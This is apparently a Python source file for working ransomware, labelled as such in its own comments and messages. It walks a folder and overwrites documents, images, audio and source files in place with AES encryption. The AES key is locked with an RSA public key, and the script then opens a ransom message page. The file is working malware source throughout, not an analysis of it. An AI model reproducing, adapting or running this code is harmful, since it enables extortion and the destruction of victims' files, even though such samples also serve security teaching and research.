import os
import webbrowser

from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA

# List of file extensions to be targeted by the ransomware. Formats such as video files are excluded because these can be very large and slow down the
# encryption process significantly.
TARGET_FILES = [
    ".txt",
    ".doc",
    ".docx",
    ".docm",
    ".odt",
    ".wav",
    ".mp3",
    ".ogg",
    ".ppt",
    ".pptx",
    ".png",
    ".jpg",
    ".jpeg",
    ".bmp",
    ".svg",
    ".cpp",
    ".gd",
    ".psd",
    ".pdf",
    ".cer",
]


# Generate a 16-byte AES key
def generate_aes_key():
    key = get_random_bytes(16)
    return key


# Store the AES key locally with RSA encryption
def store_key(key):
    rsa_key = RSA.importKey(open("RSA_PUBLIC_KEY").read())
    
    cipher = PKCS1_OAEP.new(rsa_key)
    c_key = cipher.encrypt(key)

    with open("AES_KEY", "wb") as f:
        f.write(c_key)


def encrypt_file_aes(input_file, output_file, key):
    f = open(input_file, mode="rb")
    data = f.read()

    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data)

    with open(output_file, "wb") as f:
        f.write(ciphertext)

    # Store all nonce values (random values used during AES encryption) in additional files with the .n extension
    nonce_file = output_file + ".n"
    with open(nonce_file, "wb") as f:
        f.write(nonce)


def encrypt_all_files(dir, key):
    all_files = []
    for root, dirs, files in os.walk(dir):
        for f in files:
            all_files.append((f, root))

    for f in all_files:
        filename, file_ext = os.path.splitext(f[0])
        if file_ext in TARGET_FILES:
            # The odd formatting here is a holdover from an earlier implementation that gave the encrypted files a unique prefix.
            encrypt_file_aes(f[1] + "/" + f[0], f[1] + "/" + f[0], key)

    webbrowser.open_new_tab("message.html")


if os.path.exists("AES_KEY"):
    print(
        "An existing AES key was already found. This should be removed before running the ransomware."
    )
elif not os.path.exists("RSA_PUBLIC_KEY"):
    print(
        "No RSA public key file was found. This should be included before running the ransomware."
    )
else:
    key = generate_aes_key()
    encrypt_all_files("files", key)
    store_key(key)
